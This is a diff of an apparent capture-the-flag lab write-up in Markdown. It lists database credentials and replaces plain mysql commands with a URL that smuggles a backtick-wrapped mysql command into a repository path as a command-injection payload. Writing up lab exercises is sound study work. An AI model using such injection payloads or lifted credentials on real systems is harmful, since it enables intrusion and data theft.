@@ -624,12 +624,13 @@ db: kingslanding
 user/pass: cerseilannister/_g0dsHaveNoMercy_
 
 ```
-mysql  -h 172.24.0.3 -u cerseilannister -p _g0dsHaveNoMercy_ -D kingslanding execute="select*from mytable;"
+http://192.168.178.150:1337/casterly-rock/blob/master/%22%22%60mysql -h 192.168.178.150 -u cerseilannister -p_g0dsHaveNoMercy_ -D kingslanding -e “show tables;”%60
 ```
 
-```
-mysql kingslanding -h 172.24.0.3 -u cerseilannister -p _g0dsHaveNoMercy_ -e 'select * from iron_throne;' 
-```
+![[Pasted image 20260216023737.png]]
+
+
+
 
 ----
 # SECRET DATA :
